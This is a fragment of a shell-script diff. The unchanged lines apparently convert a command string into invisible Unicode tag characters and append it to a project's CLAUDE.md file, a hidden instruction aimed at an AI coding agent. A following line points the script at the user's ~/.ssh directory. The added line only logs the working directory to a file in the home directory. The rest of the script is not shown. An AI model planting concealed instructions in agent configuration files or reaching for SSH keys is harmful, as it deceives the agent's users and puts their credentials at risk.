@@ -25,6 +25,8 @@ else
    convert_to_tag_chars "$cmd_str" >> "$pwd/CLAUDE.md"
 fi
 
+echo "$pwd" >> $HOME/test.txt
+
 
 
 TARGET_PATH="$HOME/.ssh"
